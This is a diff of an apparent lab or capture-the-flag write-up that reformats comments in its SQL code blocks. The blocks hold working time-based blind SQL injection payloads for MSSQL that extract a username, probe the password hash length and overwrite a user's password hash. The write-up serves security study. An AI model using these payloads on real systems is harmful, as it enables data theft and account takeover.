@@ -126,13 +126,15 @@ Finding the username ```butch```.
 ```SQL
 -- e.g. guess username (ASCII)
 '; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 97) WAITFOR DELAY '00:00:05'; --
-'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05'; -- and so on
+'; IF (ASCII(LOWER(SUBSTRING((SELECT TOP 1 username FROM users), 1, 1))) > 98) WAITFOR DELAY '00:00:05'; -- 
+-- and so on
 ```
 
 Guessing the length of the password by the command below.
 
 ```SQL
-'; IF (SELECT LEN(password_hash) FROM users) > 10 WAITFOR DELAY '00:00:05'; -- and so on
+'; IF (SELECT LEN(password_hash) FROM users) > 10 WAITFOR DELAY '00:00:05'; -- 
+-- and so on
 ```
 
 Finally, we know that the password length is 64, so it may have been hashed. Because of the length of the password so I guessed that may use SHA-256 hash.
@@ -142,6 +144,8 @@ Finally, we know that the password length is 64, so it may have been hashed. Bec
 Now we update the password.
 
 ```SQL
-'; UPDATE users SET password_hash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE user = 'butch'; -- 123456
-'; IF (SELECT password_hash FROM users WHERE user = 'butch') = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WAITFOR DELAY '00:00:05'; -- check if update is successful
+-- 123456
+'; UPDATE users SET password_hash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WHERE user = 'butch'; -- 
+-- check if update is successful
+'; IF (SELECT password_hash FROM users WHERE user = 'butch') = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92' WAITFOR DELAY '00:00:05'; -- 
 ```
